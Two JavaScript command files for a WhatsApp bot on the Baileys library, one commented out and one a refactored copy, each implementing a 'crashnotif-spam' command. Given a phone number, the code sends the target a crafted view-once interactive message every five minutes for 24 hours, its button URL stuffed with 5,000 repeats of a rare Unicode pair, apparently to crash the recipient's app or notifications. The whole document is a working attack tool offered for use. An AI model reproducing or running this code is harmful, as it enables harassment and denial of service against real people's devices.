// ./commands/crashnotif.js
/*
import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default {
  name: "crashnotif-spam",
  description: "Lance un spam avec la fonction crashnotif",

  async execute(context) {
    const { sock, from, msg, args } = context;

    const targetNumber = args?.[0] || "";

    const opts = msg ? { quoted: msg } : {};

    if (!targetNumber) {
      return { success: false, message: "Numéro manquant" };
    }

    const number = targetNumber.replace(/[^0-9]/g, "");
    if (number.length < 8) {
      return { success: false, message: "Numéro invalide" };
    }

    const target = number + "@s.whatsapp.net";

    try {
      const START = Date.now();
      const DURATION = 24 * 60 * 60 * 1000;      // 24 heures
      const ACTION_INTERVAL = 5 * 60 * 1000;     // 5 minutes
      const MAX_PER_HOUR = 12; // 12 par heures

      let hourCount = 0;
      let hourStart = Date.now();

      async function crashnotif(prim, target) {
        if (!prim || !target) return;

        const XandroidUi = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: { hasMediaAttachment: false },
                body: { text: "" },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "OKAY",
                        url: "https://" + "𑜦𑜠".repeat(5000) + ".com"
                      })
                    }
                  ]
                },
                contextInfo: {
                  externalAdReply: {
                    renderLargerThumbnail: false,
                    showAdAttribution: false
                  }
                }
              }
            }
          }
        };

        await prim.relayMessage(target, XandroidUi, {
          messageId: prim.generateMessageTag()
        });
      }

      while (Date.now() - START < DURATION) {
        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        if (hourCount < MAX_PER_HOUR) {
          await crashnotif(sock, target);
          hourCount++;
        }

        await new Promise(r => setTimeout(r, ACTION_INTERVAL));
      }

      return { success: true, message: `Spam crashnotif terminé sur ${number}` };

    } catch (error) {
      console.error("❌ Erreur crashnotif-spam :", error);
      return { success: false, message: "Spam crashnotif interrompu" };
    }
  }
};
*/


// ./commands/crashnotif-command.js

import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default {
  name: "crashnotif-spam",
  description: "Lance un spam avec la fonction crashnotif",

  async execute(context) {
    const { sock, from, msg, args } = context;

    const targetNumber = args?.[0] || "";
    const opts = msg ? { quoted: msg } : {};

    if (!targetNumber) {
      return { success: false, message: "Numéro manquant" };
    }

    const number = targetNumber.replace(/[^0-9]/g, "");
    if (number.length < 8) {
      return { success: false, message: "Numéro invalide" };
    }

    const target = number + "@s.whatsapp.net";

    try {
      const config = {
        duration: 24 * 60 * 60 * 1000,      // 24 heures
        actionInterval: 5 * 60 * 1000,     // 5 minutes
        maxPerHour: 12, // 12 par heures
      };

      const startTime = Date.now();
      let hourCount = 0;
      let hourStart = startTime;

      async function crashnotif(prim, target) {
        if (!prim || !target) return;

        const XandroidUi = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: { hasMediaAttachment: false },
                body: { text: "" },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "OKAY",
                        url: "https://" + "𑜦𑜠".repeat(5000) + ".com"
                      })
                    }
                  ]
                },
                contextInfo: {
                  externalAdReply: {
                    renderLargerThumbnail: false,
                    showAdAttribution: false
                  }
                }
              }
            }
          }
        };

        await prim.relayMessage(target, XandroidUi, {
          messageId: prim.generateMessageTag()
        });
      }

      while (Date.now() - startTime < config.duration) {
        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        if (hourCount < config.maxPerHour) {
          await crashnotif(sock, target);
          hourCount++;
        }

        await new Promise(r => setTimeout(r, config.actionInterval));
      }

      return { success: true, message: `Spam crashnotif terminé sur ${number}` };

    } catch (error) {
      console.error("❌ Erreur crashnotif-spam :", error);
      return { success: false, message: "Spam crashnotif interrompu" };
    }
  }
};